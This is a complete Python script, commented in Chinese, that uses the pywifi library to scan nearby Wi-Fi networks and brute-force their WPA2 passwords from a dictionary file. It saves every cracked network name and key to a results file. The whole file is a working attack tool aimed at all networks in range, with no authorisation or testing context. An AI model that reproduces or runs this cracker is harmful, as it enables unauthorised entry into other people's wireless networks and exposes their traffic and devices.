#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pywifi import *
import pywifi
import time
import sys

def main():
    try:
        #扫描时常
        scantimes = 3
        #单个密码测试延迟
        testtimes = 0.5
        output = sys.stdout
        #结果文件保存路径
        files = "TestRes.txt"
        #字典路径
        keyspath = "ruokoulin.txt"
        #字典列表
        keys = open(keyspath,"r").readlines()
        print("|KEYS %s" %(len(keys)))
        #实例化一个pywifi对象
        wifi = PyWiFi()
        #选择定一个网卡并赋值于iface
        iface = wifi.interfaces()[0]
        #移除所有热点配置
        iface.remove_all_network_profiles()
        #通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置
        scanres = scans(iface,scantimes)
    
        #统计附近被发现的热点数量
        nums = len(scanres)
        print("|SCAN GET %s" %(nums))
        print("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s\n" %("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
        #一个个密码来,防止密码表太长每个热点用不是很常用的密码来破解就会
        #浪费时间
        bmatch = []
        for i in scanres:
            bmatch.append(1)
        okmatch = []
        for j,y in enumerate(keys):
            keystmp = []
            keystmp.append(keys[j])
            #将每一个热点信息逐一进行测试
            for i,x in enumerate(scanres):
                if bmatch[i] == 0:
                    continue
                #测试完毕后，成功的结果讲存储到files中
                res = test(nums-i,iface,x,keystmp,output,testtimes)
                if res:
                    bmatch[i] = 0
                    okmatch.append(res)
                    open(files,"a").write(res)
        print(okmatch)
    except Exception as s:
            print(s)  
            
def scans(face,timeout):
    #开始扫描
    face.scan()
    time.sleep(timeout)
    #在若干秒后获取扫描结果
    return face.scan_results()    

def test(i,face,x,key,stu,ts):
    #显示对应网络名称，考虑到部分中文名啧显示bssid
    showID = x.bssid if len(x.ssid)>len(x.bssid) else x.ssid
    #迭代字典并进行爆破
    for n,k in enumerate(key):
        x.key = k.strip()
        #移除所有热点配置
        face.remove_all_network_profiles()
        #akm出错解决方法
        if len(x.akm) == 0:
            x.akm.append(const.AKM_TYPE_WPA2PSK)
        #讲封装好的目标尝试连接

        x.cipher = const.CIPHER_TYPE_CCMP        
        face.connect(face.add_network_profile(x))
        #初始化状态码，考虑到用0会发生些逻辑错误
        code = 10
        t1 = time.time()
        #循环刷新状态，如果置为0则密码错误，如超时则进行下一个
        while code != 4 :
            time.sleep(0.1)
            code = face.status()
            now = time.time()-t1            
            if code == 4:
                face.disconnect()
                return "%-*s| %s | %*s |%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
            if now>ts:
                break            
        stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s\n"%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
        stu.flush()
    return False

main()
